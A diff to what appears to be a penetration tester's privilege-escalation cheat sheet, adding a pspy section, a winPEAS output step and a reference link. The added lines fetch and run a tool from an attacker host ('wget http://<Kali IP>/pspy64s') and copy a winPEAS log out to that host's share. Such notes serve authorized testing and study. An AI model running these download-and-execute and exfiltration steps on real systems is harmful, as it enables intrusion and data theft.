@@ -48,6 +48,14 @@ chmod +x traitor-amd64
 ./traitor-amd64 -a
 ```
 
+### pspy
+
+```
+wget http://<Kali IP>/pspy64s
+chmod +x pspy64s
+./pspy64s
+```
+
 
 ## Windows
 
@@ -89,7 +97,9 @@ or
 xcopy \\<Kali IP>\share\winPEASany.exe C:\Temp\winPEAS\
 
 cd C:\Temp\winPEAS
-C:\Temp\winPEAS\winPEASany.exe
+C:\Temp\winPEAS\winPEASany.exe > C:\Temp\winPEAS\winPEAS.log
+
+xcopy C:\Temp\winPEAS\winPEAS.log \\<Kali IP>\share\
 ```
 
 
@@ -147,3 +157,4 @@ Invoke-AllChecks
 - [linuxprivchecker.py](https://github.com/sleventyeleven/linuxprivchecker)
 - [Trator](https://github.com/liamg/traitor)
 - [GTFOBins](https://gtfobins.github.io/)
+- [pspy](https://github.com/DominicBreuker/pspy)
